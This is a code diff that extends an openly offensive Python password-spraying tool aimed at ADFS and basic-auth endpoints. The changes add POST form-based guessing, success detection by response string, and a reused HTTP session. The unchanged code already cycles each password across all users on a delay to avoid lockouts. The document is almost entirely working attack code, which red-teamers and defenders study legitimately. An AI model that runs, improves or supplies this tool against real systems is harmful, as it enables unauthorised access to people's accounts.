@@ -1,5 +1,6 @@
 # Python3 tool to perform password spraying attack against ADFS
 # by @xFreed0m
+# modify by xzenx86
 
 import argparse
 import csv
@@ -59,6 +60,8 @@ def args_parse():
 
     parser.add_argument('-V', '--verbose', help="Turn on verbosity to show failed "
                                                 "attempts", action="store_true", default=False)
+    parser.add_argument('--post', help="Make POST basicauth", action="store_true", default=False)
+    parser.add_argument('-m', '--match', help="Authentification success string response")
     return parser.parse_args()
 
 
@@ -134,29 +137,47 @@ def random_time(minimum, maximum):
     return sleep_amount
 
 
-def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
+def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose, response_string, post_auth):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
-    
+
+    def valid_cred(username, password, target, output_file_name, working_creds_counter):
+        status = 'Valid creds'
+        output(status, username, password, target, output_file_name)
+        working_creds_counter += 1
+        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+
+    def invalid(username, password, target, output_file_name):
+        status = 'Invalid'
+        if verbose:
+            output(status, username, password, target, output_file_name)
+        LOGGER.debug("[-]Creds failed for: %s" % username)
+
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
+        session = requests.Session()
+
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
-                    session = requests.Session()
-                    session.auth = (username, password)
-                    response = session.get(target)
-                    #  Currently checking only if working or not, need to add more tests in the future
-                    if response.status_code == 200:
-                        status = 'Valid creds'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+
+                    if post_auth:
+                        data="username="+username+"&password="+password
+                        response = session.post(target, data=data)
                     else:
-                        status = 'Invalid'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: %s" % username)
+                        session.auth = (username, password)
+                        response = session.get(target)
+
+                    if response_string :
+                        if response_string in str(response.content) :
+                            valid_cred(username, password, target, output_file_name, working_creds_counter)
+                        else:
+                            invalid(username, password, target, output_file_name)
+                    elif response.status_code == 200:
+                            valid_cred(username, password, target, output_file_name, working_creds_counter)
+                    else:
+                        invalid(username, password, target, output_file_name)
+
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
                         time.sleep(float(sleep_time))
@@ -176,7 +197,6 @@ def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, ran
 
     except Exception as e:
         excptn(e)
-
 
 def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
@@ -228,6 +248,7 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
+        session = requests.Session()
 
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
@@ -236,7 +257,6 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
                                  "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
                     post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
                                                         'AuthMethod': 'FormsAuthentication'}).encode('ascii')
-                    session = requests.Session()
                     session.auth = (username, password)
                     response = session.post(target_url, data=post_data, allow_redirects=False,
                                             headers={'Content-Type': 'application/x-www-form-urlencoded',
@@ -343,7 +363,7 @@ def main():
     elif args.method == 'basicauth':
         LOGGER.info("[*] You chose %s method" % args.method)
         basicauth_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
-                           args.sleep, random, min_sleep, max_sleep, args.verbose)
+                           args.sleep, random, min_sleep, max_sleep, args.verbose, args.match, args.post)
 
     else:
         LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
